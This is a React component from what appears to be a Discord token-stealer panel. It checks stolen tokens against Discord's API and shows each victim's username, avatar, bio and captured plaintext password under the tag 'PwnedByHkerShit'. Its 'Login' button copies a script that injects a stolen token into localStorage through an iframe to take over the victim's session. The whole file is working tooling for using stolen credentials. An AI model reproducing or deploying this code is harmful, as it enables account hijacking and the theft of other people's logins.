import { useState, useEffect } from 'react';
import axios from 'axios';
import dayjs from 'dayjs';

const UserCard = ({token, userUsername, userDiscriminator, userAvatar, userBio, password, date, invalid}) => {
	
	const copyToken = (tk) => {
		navigator.clipboard.writeText(tk);
	}

	const copyScript = (tk) => {
		navigator.clipboard.writeText(`
			function login(token) {
		    	setInterval(() => {
		      		document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`
		    	}, 50);
		    	setTimeout(() => {
		      		location.reload();
		    	}, 2500);
		  	}
			login('${tk}')
	`);
	}
	return (
		<div className="token-card">
			<span className="token-info">
				{
					!invalid ?
					token.slice(0, 30) + "..."
					: token
				}
			</span>
			<div className="token-card-header">
				<img
					alt={userUsername + "#" + userDiscriminator} 
					src={userAvatar} 
				/>
				{
					!invalid ?
					<span>
						<button className="login-token-button" onClick={() => copyScript(token)}>
							Login
						</button>
					</span> : ""
				}
			</div>
			<div className="token-card-body" onClick={() => copyToken(token)}>
				<h3>
					<span>{userUsername}</span>
					#{userDiscriminator}
				</h3>
				<p>
					<span>$psw: </span> 
					{password}
				</p>
				<hr />
				<p className="about-me">About me</p>
				<p>{userBio}</p>
				<p>{dayjs(date).format("MM/DD/YYYY")}</p>
			</div>
		</div>
	)
}

const GotTokens = ({token, date, password, username}) => {
	const [user, setUser] = useState(null);

	useEffect(() => {
		const fetchUsers = async () => {
			try {
				const tk = await axios.get('https://discord.com/api/v9/users/@me', {
					headers: {
						Authorization: token
					}
				});
				setUser(tk.data);
			} catch(e) {

			}
		}
		fetchUsers();
	}, [token]);

	return (
		<>
		{
			user ? 
				<UserCard 
					token={token}
					userUsername={user.username}
					userDiscriminator={user.discriminator}
					userAvatar={user.avatar ? 
						"https://cdn.discordapp.com/avatars/" + user.id + "/" + user.avatar 
						: "https://i.pinimg.com/736x/35/79/3b/35793b67607923a68d813a72185284fe.jpg" 
					}
					userBio={user.bio ? user.bio : "PwnedByHkerShit since"}
					password={password !== null ? password : "Nope"}
					date={date}
					username={user.username}

				/>
			: 	
				<UserCard 
					token="No fue posible cargar a este usuario"
					userUsername={username.split("#").slice(0)}
					userDiscriminator={username.split("#").slice(1)}
					userAvatar="https://i.pinimg.com/736x/35/79/3b/35793b67607923a68d813a72185284fe.jpg"
					userBio={"No se ha podido cargar a este usuario"}
					password={password !== null ? password : "Nope"}
					date={date}
					invalid
				/>
		}
		</>
	)
}

export default GotTokens;